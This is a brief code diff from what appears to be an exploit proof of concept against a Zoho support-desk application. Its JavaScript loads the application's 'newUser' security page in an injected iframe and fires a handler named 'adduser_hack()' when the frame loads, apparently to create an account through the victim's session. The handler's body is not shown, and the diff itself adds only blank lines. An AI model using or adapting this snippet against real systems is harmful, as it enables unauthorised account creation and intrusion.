@@ -3,7 +3,9 @@
 var iframe = jQuery("<iframe></iframe>");
 jQuery(iframe).attr("src","Security.do?actionName=newUser&frameorigin=https://supportdesk.localzoho.com");
 jQuery(iframe).attr("onload","adduser_hack()");
+
 jQuery("body").append(iframe);
+
 
 
 
